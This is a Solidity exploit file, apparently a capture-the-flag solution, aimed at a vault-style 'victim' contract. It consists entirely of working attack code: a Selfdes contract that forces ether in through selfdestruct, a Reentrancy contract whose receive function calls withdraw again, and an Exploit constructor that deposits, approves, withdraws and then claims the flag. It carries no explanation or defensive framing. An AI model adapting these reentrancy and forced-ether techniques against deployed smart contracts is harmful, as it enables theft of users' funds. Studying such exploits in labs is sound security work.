// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;
interface victim{
  function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
  function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);  
  function approve(address spender, uint256 amount) external returns (bool);
  function captureTheFlag(address newFlagHolder) external;
}
contract Selfdes{
    constructor(address target) payable {
      selfdestruct(payable(target));
    }
}

contract Reentrancy{
  victim VictimContract;
  address creator;
  constructor(address target, address _creator) payable {
    VictimContract = victim(target);
    creator = _creator;
  }
  function forceSend(uint amount) public returns (address){
    Selfdes temp = (new Selfdes){value:amount}(address(VictimContract));
    return address(temp);
  }
  receive() external payable {
    forceSend(msg.value);
    VictimContract.withdraw(1 ether, 0x4ce813AE26a83b757572a3463f97C9FB6e51Fa7d, creator);
  }
}

contract Exploit{
  victim targetContract;
  function forceSend(uint amount) public returns (address){
    Selfdes temp = (new Selfdes){value:amount}(address(targetContract));
    return address(temp);
  }  
  constructor(address target) payable {
    require(msg.value == 3 ether, "Must init contract with 3 ETH");
    targetContract = victim(target);
    Reentrancy attacker = new Reentrancy(target, address(this));
    forceSend(1 ether);
    targetContract.deposit{value: 2 ether}(2 ether, address(this));
    targetContract.approve(address(attacker), 1 ether);   
    targetContract.withdraw(1 ether, address(attacker), address(this));
    targetContract.captureTheFlag(address(this));
  }

}